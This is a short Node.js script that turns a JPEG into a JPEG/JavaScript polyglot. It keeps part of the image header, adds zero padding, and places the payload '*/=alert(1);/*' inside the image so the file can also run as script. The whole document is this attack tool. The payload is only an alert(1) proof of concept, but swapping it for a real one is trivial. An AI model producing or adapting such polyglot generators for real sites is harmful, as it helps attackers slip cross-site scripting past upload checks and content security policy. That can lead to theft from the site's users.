const fs = require('fs');

const a = fs.readFileSync('img/copy/copy4.jpg');
const b = a.toString('hex');
const c = b.substr(0, 40);

const d = Array(12044).fill("00").join("");
const e = `*/=alert(1);/*`.split("").map(function(e){
	return e.charCodeAt(0).toString(16)
}).join("");
const f = b.substr(40, b.length);
const g = c + d + e + f;
const h = Buffer.from(g, "hex");

fs.writeFile("img/out/out3.jpg", h, err => {
	console.log(err, "done");
});
